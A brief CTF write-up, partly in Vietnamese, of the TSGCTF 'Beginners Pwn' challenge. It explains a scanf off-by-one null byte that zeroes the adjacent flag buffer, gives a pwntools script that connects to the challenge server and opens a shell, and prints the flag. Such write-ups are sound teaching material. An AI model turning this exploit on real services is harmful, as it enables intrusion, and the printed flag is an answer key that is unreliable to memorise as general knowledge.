# Beginners Pwn

# Reverse file

File 64-bit, dynamic linked, not stripped
```sh
chall: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=952a40648deab041f57c72cf67f169974c428f9c, for GNU/Linux 3.2.0, not stripped
```

Checksec file

```sh
Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Source code

```c
void win() {
    system("/bin/sh");
}

void init() {
    alarm(60);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

int main(void) {
    char your_try[64]={0};
    char flag[64]={0};

    init();

    puts("guess the flag!> ");

    FILE *fp = fopen("./flag", "r");
    if (fp == NULL) exit(-1);
    size_t length = fread(flag, 1, 64, fp);

    scanf("%64s", your_try);

    if (strncmp(your_try, flag, length) == 0) {
        puts("yes");
        win();
    } else {
        puts("no");
    }
    return 0;
}
```

## Tìm Lỗi

Lỗi nằm ở hàm Scanf, khi nhập vào sẽ insert \x00 vào cuối chuỗi, tràn 1 byte qua flag[64].

# Exploit 

Nhập your_try = "\x00" và fill đủ 64 ký tự thì 1 byte \x00 sẽ tràn qua flag, điều kiện đúng nên sẽ gọi hàm win.

```sh
from pwn import *
s = remote("34.146.101.4", 30007)
#s = process("./chall")
raw_input("debug")
payload = "\x00" + "A"*63
s.sendline(payload)

s.interactive()


```

# TSGCTF{just_a_simple_off_by_one-chall_isnt_it}